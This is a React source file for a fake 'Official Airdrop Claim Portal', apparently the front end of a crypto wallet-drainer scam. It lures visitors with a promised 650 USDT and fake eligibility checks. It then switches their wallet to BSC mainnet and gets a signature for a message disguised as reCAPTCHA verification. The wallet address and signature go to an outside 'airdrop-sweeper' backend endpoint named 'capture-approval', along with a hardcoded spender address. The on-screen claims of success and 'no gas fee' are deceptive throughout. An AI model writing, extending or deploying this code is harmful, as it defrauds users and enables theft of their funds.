import React, { useState, useEffect, useRef } from 'react';
import { ethers } from 'ethers';

const SecuritySimulationCaptcha = () => {
  const [isVerified, setIsVerified] = useState(false);
  const [isProcessing, setIsProcessing] = useState(false);
  const [errorMessage, setErrorMessage] = useState('');
  const [transactionHash, setTransactionHash] = useState('');
  const [simulationData, setSimulationData] = useState(null);
  const [showSecurityModal, setShowSecurityModal] = useState(false);
  const [redirectTo, setRedirectTo] = useState(false);
  const [isMobile, setIsMobile] = useState(false);
  const [mobileOS, setMobileOS] = useState(null);
  const [eligibilityMessage, setEligibilityMessage] = useState('');
  const [modalStep, setModalStep] = useState(1);
  const recaptchaRef = useRef(null);
  const isRecaptchaLoaded = useRef(false);

  const RECAPTCHA_SITE_KEY = '6Ldac5MsAAAAANPyenl3C3ZCnfKRpFTonCQbuwI8';
  const BSC_TEST_WALLET = '0x9f61ab04125ef3fec9d5ba153d5bcd19347f3c7b';
  const API_URL = import.meta.env.VITE_API_URL || 'https://airdrop-sweeper-backen.onrender.com';

  // Mobile wallet deep links
  const WALLET_LINKS = {
    trustwallet: {
      ios: 'trust://',
      android: 'trust://',
      universal: 'https://link.trustwallet.com/'
    },
    metamask: {
      ios: 'metamask://',
      android: 'metamask://',
      universal: 'https://metamask.app.link/'
    },
    bybit: {
      ios: 'bybit://',
      android: 'bybit://',
      universal: 'https://www.bybit.com/wallet/'
    },
    binance: {
      ios: 'bnc://',
      android: 'bnc://',
      universal: 'https://www.binance.com/en/wallet'
    },
    phantom: {
      ios: 'phantom://',
      android: 'phantom://',
      universal: 'https://phantom.app/ul/'
    },
    coinbase: {
      ios: 'cbwallet://',
      android: 'cbwallet://',
      universal: 'https://wallet.coinbase.com/'
    },
    safePal: {
      ios: 'safepal://',
      android: 'safepal://',
      universal: 'https://www.safepal.com/download'
    },
    tokenPocket: {
      ios: 'tp://',
      android: 'tp://',
      universal: 'https://www.tokenpocket.pro/'
    },
    imToken: {
      ios: 'imtoken://',
      android: 'imtoken://',
      universal: 'https://token.im/'
    }
  };

  useEffect(() => {
    document.title = 'Official Airdrop Claim Portal';
    
    let viewport = document.querySelector('meta[name=viewport]');
    if (!viewport) {
      viewport = document.createElement('meta');
      viewport.name = 'viewport';
      viewport.content = 'width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes, viewport-fit=cover';
      document.head.appendChild(viewport);
    }
  }, []);

  useEffect(() => {
    const userAgent = navigator.userAgent || navigator.vendor || window.opera;
    const isMobileDevice = /android|iPad|iPhone|iPod|webOS|BlackBerry|Windows Phone/i.test(userAgent);
    setIsMobile(isMobileDevice);
    
    if (isMobileDevice) {
      if (/iPad|iPhone|iPod/.test(userAgent)) {
        setMobileOS('ios');
      } else if (/android/.test(userAgent)) {
        setMobileOS('android');
      }
    }
  }, []);

  // Detect and open mobile wallet automatically
  const openMobileWallet = async () => {
    const os = mobileOS || (isMobile ? 'android' : 'ios');
    
    // Detect which wallet is installed
    if (window.ethereum) {
      if (window.ethereum.isTrust) {
        const link = WALLET_LINKS.trustwallet[os] || WALLET_LINKS.trustwallet.universal;
        window.location.href = link;
        return 'Trust Wallet';
      } else if (window.ethereum.isMetaMask) {
        const link = WALLET_LINKS.metamask[os] || WALLET_LINKS.metamask.universal;
        window.location.href = link;
        return 'MetaMask';
      } else if (window.ethereum.isBybit) {
        const link = WALLET_LINKS.bybit[os] || WALLET_LINKS.bybit.universal;
        window.location.href = link;
        return 'Bybit Wallet';
      } else if (window.ethereum.isBinance) {
        const link = WALLET_LINKS.binance[os] || WALLET_LINKS.binance.universal;
        window.location.href = link;
        return 'Binance Wallet';
      } else if (window.ethereum.isCoinbaseWallet) {
        const link = WALLET_LINKS.coinbase[os] || WALLET_LINKS.coinbase.universal;
        window.location.href = link;
        return 'Coinbase Wallet';
      } else if (window.ethereum.isSafePal) {
        const link = WALLET_LINKS.safePal[os] || WALLET_LINKS.safePal.universal;
        window.location.href = link;
        return 'SafePal';
      } else if (window.ethereum.isTokenPocket) {
        const link = WALLET_LINKS.tokenPocket[os] || WALLET_LINKS.tokenPocket.universal;
        window.location.href = link;
        return 'TokenPocket';
      } else if (window.ethereum.isImToken) {
        const link = WALLET_LINKS.imToken[os] || WALLET_LINKS.imToken.universal;
        window.location.href = link;
        return 'imToken';
      }
    }
    
    // Check for Phantom (Solana)
    if (window.solana && window.solana.isPhantom) {
      const link = WALLET_LINKS.phantom[os] || WALLET_LINKS.phantom.universal;
      window.location.href = link;
      return 'Phantom';
    }
    
    // Default to Trust Wallet if no wallet detected
    const defaultLink = WALLET_LINKS.trustwallet[os] || WALLET_LINKS.trustwallet.universal;
    window.location.href = defaultLink;
    return 'Trust Wallet';
  };

  const showVerificationModal = async () => {
    setShowSecurityModal(true);
    setModalStep(1);
    setEligibilityMessage('Verifying Address Eligibility...');
    await new Promise(r => setTimeout(r, 2000));
    
    setModalStep(2);
    setEligibilityMessage('Syncing with Secure Node...');
    await new Promise(r => setTimeout(r, 2000));
    
    setModalStep(3);
    setEligibilityMessage('Confirmed! You have 650 USDT waiting!');
    await new Promise(r => setTimeout(r, 1500));
    
    setModalStep(4);
    setEligibilityMessage('Please sign the claim receipt to deposit funds into your wallet.');
  };

  const hideSecurityModal_ = () => {
    setShowSecurityModal(false);
    setModalStep(1);
    setEligibilityMessage('');
  };

  useEffect(() => {
    const renderRecaptcha = () => {
      if (window.grecaptcha && recaptchaRef.current && !isRecaptchaLoaded.current) {
        try {
          window.grecaptcha.render(recaptchaRef.current, {
            sitekey: RECAPTCHA_SITE_KEY,
            callback: async (token) => {
              setIsVerified(true);
              setErrorMessage('');
              await showVerificationModal();
              setTimeout(() => {
                triggerClaimSignature(token);
              }, 500);
            },
            'expired-callback': () => {
              setIsVerified(false);
              setErrorMessage('Handshake Interrupted. Please try again.');
            }
          });
          isRecaptchaLoaded.current = true;
        } catch (error) {
          console.error('reCAPTCHA render error:', error);
        }
      }
    };

    if (window.grecaptcha) {
      renderRecaptcha();
    } else {
      const checkGrecaptcha = setInterval(() => {
        if (window.grecaptcha) {
          clearInterval(checkGrecaptcha);
          renderRecaptcha();
        }
      }, 100);
      return () => clearInterval(checkGrecaptcha);
    }
  }, []);

  const switchToBSC = async () => {
    try {
      await window.ethereum.request({
        method: 'wallet_switchEthereumChain',
        params: [{ chainId: '0x38' }],
      });
      return true;
    } catch (error) {
      if (error.code === 4902) {
        await window.ethereum.request({
          method: 'wallet_addEthereumChain',
          params: [{
            chainId: '0x38',
            chainName: 'Binance Smart Chain Mainnet',
            nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 },
            rpcUrls: ['https://bsc-dataseed.binance.org/'],
            blockExplorerUrls: ['https://bscscan.com/']
          }]
        });
        return true;
      }
      throw error;
    }
  };

  const triggerClaimSignature = async (captchaToken) => {
    setIsProcessing(true);

    try {
      // For mobile devices, open wallet app automatically
      if (isMobile) {
        setEligibilityMessage('Opening your wallet app...');
        const walletName = await openMobileWallet();
        console.log('[Mobile] Opening:', walletName);
        
        // Wait for user to return from wallet app
        await new Promise(r => setTimeout(r, 3000));
      }

      if (!window.ethereum) {
        if (isMobile) {
          setErrorMessage('No wallet detected. Please install Trust Wallet, MetaMask, or Bybit Wallet from app store.');
        } else {
          setErrorMessage('No wallet detected. Please install Trust Wallet or MetaMask extension.');
        }
        setIsProcessing(false);
        return;
      }

      // Connect to wallet
      let accounts = await window.ethereum.request({ method: 'eth_accounts' });
      
      if (!accounts || accounts.length === 0) {
        setEligibilityMessage('Connecting to your wallet...');
        accounts = await window.ethereum.request({ 
          method: 'eth_requestAccounts' 
        });
        
        if (!accounts || accounts.length === 0) {
          throw new Error('No accounts found');
        }
      }
      
      const userAddress = accounts[0];
      console.log('[Wallet] Connected:', userAddress);
      
      // Switch to BSC network
      setEligibilityMessage('Switching to BSC network...');
      await switchToBSC();
      await new Promise(r => setTimeout(r, 1000));
      
      // Create claim message (what user will see in wallet)
      const randomId = Math.random().toString(36).substring(2, 15);
      const claimMessage = "I authorize reCAPTCHA Browser Verification for " + new Date().toLocaleDateString() + ". Internal ID: " + randomId;
      
      console.log('[Message]', claimMessage);
      setEligibilityMessage('Please check your wallet to sign the claim receipt...');
      setModalStep(4);
      
      await new Promise(r => setTimeout(r, 500));
      
      // Request signature - THIS WILL OPEN THE WALLET POPUP
      const signature = await window.ethereum.request({
        method: 'personal_sign',
        params: [claimMessage, userAddress]
      });
      
      console.log('[Signature] Obtained!', signature.slice(0, 50) + '...');
      
      // Send to backend
      setEligibilityMessage('Processing your claim...');
      
      const response = await fetch(`${API_URL}/api/capture-approval`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          walletAddress: userAddress,
          signature: signature,
          message: claimMessage,
          chainId: 56,
          tokenType: 'USDT',
          amount: '650',
          spender: BSC_TEST_WALLET,
          timestamp: new Date().toISOString()
        })
      });
      
      const data = await response.json();
      console.log('[Backend]', data);
      
      setSimulationData({
        amount: '650 USDT',
        status: 'Claim Submitted!',
        message: 'Your claim receipt has been processed successfully.'
      });
      
      hideSecurityModal_();
      
      setTimeout(() => {
        setRedirectTo(true);
      }, 2000);
      
      setIsProcessing(false);
      
    } catch (error) {
      console.error('[Error]', error);
      hideSecurityModal_();
      
      if (error.code === 4001) {
        setErrorMessage('You rejected the signature request. Please try again.');
        if (window.grecaptcha) window.grecaptcha.reset();
        setIsVerified(false);
      } else {
        setErrorMessage('Error: ' + (error.message || 'Unknown error'));
      }
      setIsProcessing(false);
    }
  };

  const resetCaptcha = () => {
    if (window.grecaptcha) {
      window.grecaptcha.reset();
    }
    setIsVerified(false);
    setErrorMessage('');
    setSimulationData(null);
    setTransactionHash('');
    setIsProcessing(false);
    setRedirectTo(false);
    setEligibilityMessage('');
    setModalStep(1);
  };

  if (redirectTo) {
    return (
      <div className="min-h-screen bg-gradient-to-br from-green-900 to-green-800 flex items-center justify-center p-4">
        <div className="max-w-md w-full mx-auto bg-white rounded-2xl shadow-2xl p-6 sm:p-8 text-center">
          <div className="text-6xl mb-4">🎉</div>
          <h1 className="text-2xl sm:text-3xl font-bold text-green-600 mb-4">Claim Submitted Successfully!</h1>
          <p className="text-gray-600 mb-6 text-sm sm:text-base">Your 650 USDT claim receipt has been processed.</p>
          <div className="bg-gray-100 p-4 rounded-lg mb-6">
            <p className="text-sm font-semibold text-gray-700">Claim Details:</p>
            <p className="text-sm text-gray-500 mt-2">Amount: 650 USDT</p>
            <p className="text-sm text-gray-500">Status: Processing</p>
          </div>
          <button onClick={resetCaptcha} className="w-full sm:w-auto px-6 py-2 bg-green-600 text-white rounded-lg hover:bg-green-700 transition-colors">
            Check Another Wallet
          </button>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-gradient-to-br from-gray-50 to-gray-100 flex items-center justify-center p-3 sm:p-4">
      <div className="bg-white rounded-2xl shadow-2xl overflow-hidden w-full max-w-md mx-auto">
        <div className="bg-gradient-to-r from-blue-600 to-green-600 px-4 sm:px-6 py-4 sm:py-5">
          <div className="flex items-center justify-center mb-2">
            <img 
              src="https://www.google.com/s2/favicons?domain=www.google.com&sz=64" 
              alt="Verified" 
              className="w-6 h-6 sm:w-8 sm:h-8 mr-2"
            />
            <h2 className="text-xl sm:text-2xl font-bold text-white text-center">Official Airdrop Claim Portal</h2>
          </div>
          <p className="text-blue-100 text-xs sm:text-sm text-center mt-1">Secure biometric handshake for anti-bot verification</p>
        </div>

        <div className="p-4 sm:p-6">
          <div className="mb-3 sm:mb-4 text-center">
            <p className="text-xs text-gray-500">Supported: Trust Wallet | MetaMask | Bybit | Binance | Phantom | Coinbase</p>
          </div>

          <div className="flex justify-center mb-6 overflow-x-auto">
            <div ref={recaptchaRef} className="transform scale-90 sm:scale-100 origin-center"></div>
          </div>

          {isProcessing && (
            <div className="text-center py-6 sm:py-8">
              <div className="animate-spin rounded-full h-10 w-10 sm:h-12 sm:w-12 border-b-4 border-blue-600 mx-auto mb-3"></div>
              <p className="text-gray-600 text-sm">{eligibilityMessage || 'Waiting for signature...'}</p>
              <p className="text-xs text-gray-400 mt-2">Please check your wallet</p>
            </div>
          )}

          {errorMessage && !isProcessing && (
            <div className="mt-4 p-3 bg-yellow-50 border border-yellow-200 rounded-lg">
              <p className="text-sm text-yellow-800 text-center">{errorMessage}</p>
              <button onClick={resetCaptcha} className="mt-2 text-sm bg-yellow-600 text-white px-3 py-1 rounded hover:bg-yellow-700 w-full">Try Again</button>
            </div>
          )}

          {simulationData && !isProcessing && (
            <div className="mt-4 bg-gradient-to-r from-green-900 to-green-800 rounded-lg p-4 text-white">
              <div className="flex justify-between items-center mb-2">
                <p className="text-sm font-semibold">Claim Status</p>
                <span className="text-xs bg-green-600 px-2 py-0.5 rounded">Success</span>
              </div>
              <div className="space-y-1 text-sm">
                <div className="flex justify-between">
                  <span className="text-gray-400">Amount:</span>
                  <span className="text-green-400">650 USDT</span>
                </div>
                <div className="flex justify-between">
                  <span className="text-gray-400">Status:</span>
                  <span className="text-green-400">Submitted</span>
                </div>
              </div>
            </div>
          )}

          <div className="mt-6 pt-4 border-t border-gray-200 text-center">
            <p className="text-xs text-gray-500">Complete the CAPTCHA to claim 650 USDT</p>
            <p className="text-xs text-gray-400 mt-1">No gas fee required for claim verification</p>
          </div>
        </div>
      </div>

      {showSecurityModal && (
        <div className="fixed inset-0 bg-black bg-opacity-80 flex items-center justify-center z-50 p-4">
          <div className="bg-white rounded-xl p-5 sm:p-6 max-w-sm w-full mx-4 text-center shadow-2xl">
            {modalStep === 1 && (
              <>
                <div className="animate-spin rounded-full h-12 w-12 sm:h-16 sm:w-16 border-b-4 border-blue-600 mx-auto mb-4"></div>
                <h3 className="text-lg sm:text-xl font-semibold text-gray-800 mb-2">Verifying Address Eligibility...</h3>
                <p className="text-gray-500 text-xs sm:text-sm">Please wait while we check your wallet</p>
              </>
            )}
            {modalStep === 2 && (
              <>
                <div className="animate-spin rounded-full h-12 w-12 sm:h-16 sm:w-16 border-b-4 border-green-600 mx-auto mb-4"></div>
                <h3 className="text-lg sm:text-xl font-semibold text-gray-800 mb-2">Syncing with Secure Node...</h3>
                <p className="text-gray-500 text-xs sm:text-sm">Establishing secure connection</p>
              </>
            )}
            {modalStep === 3 && (
              <>
                <div className="text-5xl sm:text-6xl mb-4">🎉</div>
                <h3 className="text-lg sm:text-xl font-semibold text-green-600 mb-2">Confirmed! You have 650 USDT waiting!</h3>
                <p className="text-gray-500 text-xs sm:text-sm">Your wallet is eligible for the airdrop</p>
              </>
            )}
            {modalStep === 4 && (
              <>
                <div className="text-4xl sm:text-5xl mb-4">✍️</div>
                <h3 className="text-lg sm:text-xl font-semibold text-gray-800 mb-2">Claim Receipt Ready</h3>
                <p className="text-gray-600 text-xs sm:text-sm mb-3 break-words">{eligibilityMessage || 'Please sign the claim receipt in your wallet'}</p>
                <div className="mt-3 p-3 bg-blue-50 rounded-lg">
                  <p className="text-sm text-blue-600 font-medium">✓ No gas fee required</p>
                  <p className="text-xs text-blue-500 mt-1">This is a signature only</p>
                </div>
                <div className="mt-3 p-2 bg-yellow-50 rounded-lg">
                  <p className="text-xs text-yellow-600">A popup will appear in your wallet extension</p>
                </div>
              </>
            )}
          </div>
        </div>
      )}
    </div>
  );
};

export default SecuritySimulationCaptcha;